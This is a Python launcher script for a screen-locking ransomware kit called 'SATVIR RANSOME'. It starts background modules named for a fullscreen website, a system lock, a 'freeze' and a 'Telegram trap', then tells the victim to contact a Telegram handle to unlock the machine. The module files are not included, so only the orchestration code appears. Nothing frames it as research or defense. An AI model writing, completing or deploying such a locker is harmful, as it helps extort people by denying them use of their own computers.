#!/usr/bin/env python3
# run_all.py - Starts all modules together

import os
import subprocess
import sys
import time

def run_all():
    print("="*50)
    print("💀 SATVIR RANSOME - Full System")
    print("="*50)
    print("✅ Starting all modules...")
    print("📱 Opening website...")
    print("🔒 Locking system...")
    print("="*50)
    
    # Open website in fullscreen
    os.system('python full.py &')
    time.sleep(2)
    
    # Start lock
    os.system('python lock.py &')
    time.sleep(1)
    
    # Start freeze
    os.system('python work.py &')
    time.sleep(1)
    
    # Start Telegram trap
    os.system('python tg.py &')
    
    print("\n⚠️ All systems running")
    print("📞 Contact @notxsatvir to unlock")
    print("🔑 Admin panel: admin.html")
    print("="*50)
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n🔓 System unlocked by admin")
        sys.exit(0)

if __name__ == "__main__":
    run_all()